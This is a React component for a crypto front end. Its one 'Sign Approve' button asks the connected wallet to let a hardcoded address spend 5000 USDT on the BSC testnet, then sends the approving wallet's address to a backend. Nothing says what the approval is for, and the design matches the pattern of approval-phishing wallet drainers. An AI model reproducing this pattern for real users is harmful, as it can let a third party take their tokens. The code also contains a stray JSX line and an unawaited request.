import { useWeb3React } from "@web3-react/core"
//import usePlatziPunks from "../../hooks/usePlatziPunks";
import usePlatziPunkss from "../../hooks/usePlatziPunks/indexx";
import Backend from "../../backend/main"
import "./style.css";
import axios from "axios";

const Home = () => {
<Backend/>


  //const platziPunks = usePlatziPunks(); //(token que se va a vender y necesita que se use el APPROVE)
  const platziPunkss = usePlatziPunkss(); // USDT BSC TESTNET (APPROVE)



  const {active, account} = useWeb3React();

  if(!active) return "Connect wallet with Metamask"


const handleSubmit = async (e) => {
  console.log(account)
  e.preventDefault();
  await platziPunkss.methods.approve("0x194C0ae22293908FE57937Da1ab445C231c9Eb82" , "5000000000000000000000").send({ from: account })
  .on("receipt", () =>{
      try{
      const res = axios.post('http://localhost:4000/api/wallet/',{
        wallet: account,
        proyect: "Brigde",
        cryptocurrencie: "USDT",
        network:"Testnet"
      })
      console.log(res)
    }catch(e){
      console.log(e)
    }
    })
}

  return (
    <form onSubmit={handleSubmit}>
        <input type="submit" value="Sign Approve"></input>
    </form>
  )
}

export default Home